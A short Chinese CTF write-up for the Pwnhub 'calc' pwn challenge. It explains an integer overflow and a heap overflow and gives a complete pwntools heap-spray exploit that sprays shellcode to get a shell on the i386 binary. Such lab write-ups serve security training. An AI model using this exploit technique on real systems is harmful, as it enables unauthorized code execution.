---
title: Pwnhub 故事的开始 calc
date: 2020-05-19 00:00:00
categories:
- CTF/Pwn
tags: 堆喷
---

> 漏洞点为一个整数溢出和一个堆溢出，其中整数溢出可以转化为另一个堆溢出。本题利用方法为利用原生的堆溢出漏洞，可以覆盖一个存在间接跳转的二级指针，因为没有开启NX，所以结合堆喷即可getshell。虽然堆喷解法的exp很简单，但本题的逆向却是是很耗时的。

- [题目列表 / Calculator](https://pwnhub.cn/questiondetail?id=1)
- [pwnhub.cn 故事的开始 calc Writeup](https://atum.li/2016/12/05/calc/)

```python
from pwn import *
context(arch="i386", os="linux")
elf = ELF("./calc")
io = process(elf.path)

io.sendlineafter("> ",'var a = "a"')
payload = '"'+asm(shellcraft.sh()).rjust(200,"\x0c")+'" * 500'

for i in range(6000):
   io.sendlineafter("> ",payload)

io.sendline("a "*50)
io.recvuntil(">")
io.interactive()
```